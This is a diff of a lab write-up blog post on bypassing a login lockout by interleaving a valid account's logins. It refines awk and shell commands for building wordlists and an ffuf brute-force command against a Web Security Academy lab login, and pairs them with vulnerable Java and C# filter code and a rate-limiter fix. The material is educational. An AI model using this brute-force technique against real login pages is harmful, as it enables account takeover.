@@ -18,28 +18,34 @@ media_subpath: /assets/img/posts/2025-12-19-lab04_authentication/
 
 **Objective:** Brute-force `carlos`'s password by resetting the lockout counter using `wiener`'s credentials.
 
-1. **Reconnaissance:** I attempted to brute-force `carlos` directly. After 3-5 failed attempts, the server returned "You have made too many incorrect login attempts."
-2. **Testing the Flaw:** I waited for the ban to expire. I then tried the pattern: `Fail (Carlos) -> Fail (Carlos) -> Success (Wiener)`. I noticed that the counter reset, allowing me to try `Carlos` again immediately without being blocked.
+1. **Reconnaissance:** I attempted to brute-force `carlos` directly. After 3 failed attempts, the server returned "You have made too many incorrect login attempts. Please try again in 1 minute(s)."
+2. **Testing the Flaw:** I waited for the ban to expire. I then tried the pattern: `Fail (Carlos) -> Fail (Carlos) -> Fail (Carlos) -> Success (Wiener)`. I noticed that the counter reset, allowing me to try `Carlos` again immediately without being blocked.
 3. **Preparation:**
     - I used `awk` to create a password list that inserts my valid password (`peter`) only after every 3 candidate passwords.
         
         ```bash
         awk '{print $0} NR%3==0 {print "peter"}' candidates.txt > batch_passwords.txt
         ```
-        
+    - I created a usernamelist where first comes wiener and then 3 times carlos:
+
         ```bash
-        carlos
+        { for i in {1..33}; do echo "wiener"; yes "carlos" | head -n 3; done; echo "wiener"; echo "carlos"; } > usernames.txt
+        ```
+
+        ```bash
         wiener
+        carlos
+        carlos
         carlos
         wiener
         ...
         ```
 4. **Exploitation:**
     - I ran `ffuf` in **Pitchfork** mode (pairing line 1 of user list with line 1 of pass list).
-    - **Crucial:** I set threads to `t 1` to ensure requests were sent sequentially. If sent in parallel, multiple failures might hit the server before the "reset" login arrives, triggering the ban.
+    - **Crucial:** I set threads to `-t 1` to ensure requests were sent sequentially. If sent in parallel, multiple failures might hit the server before the "reset" login arrives, triggering the ban.
     - **Command:**
         ```bash
-        ffuf -X POST -w ./output_pass.txt:FUZZ -w ./mixed_users.txt:FUZ2Z \
+        ffuf -X POST -w ./batch_passwords.txt:FUZZ -w ./usernames.txt:FUZ2Z \
           -u https://LAB-ID.web-security-academy.net/login \
           -d 'username=FUZ2Z&password=FUZZ' \
           -fr "Incorrect password" -t 1
@@ -80,7 +86,7 @@ public class BruteForceFilter extends OncePerRequestFilter {
         
         // Block if count > 3
         if (ipFailures.getOrDefault(ip, 0) > 3) {
-            throw new LockedException("Too many attempts");
+            throw new LockedException("You have made too many incorrect login attempts. Please try again in 1 minute(s).");
         }
         
         chain.doFilter(request, response);
@@ -105,7 +111,7 @@ public async Task<IActionResult> Login(LoginModel model)
     if (result.Succeeded)
     {
         // FLAW: Many custom implementations manually clear the IP block list here
-        // or the framework clears the AccessFailedCount for the *current* user,
+        // or the framework clears the AccessFailedCount for the current user,
         // but if the custom IP rate limiter hooks into this Success event, it resets the IP tracking.
         _ipRateLimiter.ResetCounter(HttpContext.Connection.RemoteIpAddress);
         return Ok();
@@ -140,7 +146,8 @@ We need to decouple "User Lockout" from "IP Rate Limiting."
 // SECURE: Independent Rate Limiter (Token Bucket / Sliding Window)
 public class LoginController {
 
-    Bucket ipBucket = Bucket4j.builder().addLimit(Bandwidth.simple(5, Duration.ofMinutes(1))).build();
+    Bandwidth limit = Bandwidth.simple(5, Duration.ofMinutes(1));
+    Bucket ipBucket = Bucket4j.builder().addLimit(limit).build();
 
     @PostMapping("/login")
     public String login(...) {
